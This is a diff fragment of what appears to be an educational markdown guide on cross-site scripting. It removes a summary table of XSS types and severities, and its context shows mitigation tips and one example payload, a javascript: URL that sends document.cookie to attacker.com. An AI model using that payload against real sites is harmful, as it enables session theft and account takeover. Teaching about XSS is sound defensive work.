@@ -144,14 +144,6 @@ javascript:fetch('https://attacker.com?cookie='+document.cookie)
 - Disable inline scripts using CSP
 - Avoid `innerHTML`, `document.write()`, `eval()`
 
-## Summary
-
-| Type            | Trigger Point      | Data Source     | Severity        |
-|-----------------|--------------------|------------------|-----------------|
-| Reflected XSS   | On URL/request     | Query parameters | Medium          |
-| Stored XSS      | On page load       | Database/content | High            |
-| DOM-Based XSS   | In browser JS      | Fragment/hash    | High            |
-| Self XSS        | User-initiated     | Console input    | Social Engineering |
 
 ## Conclusion
 
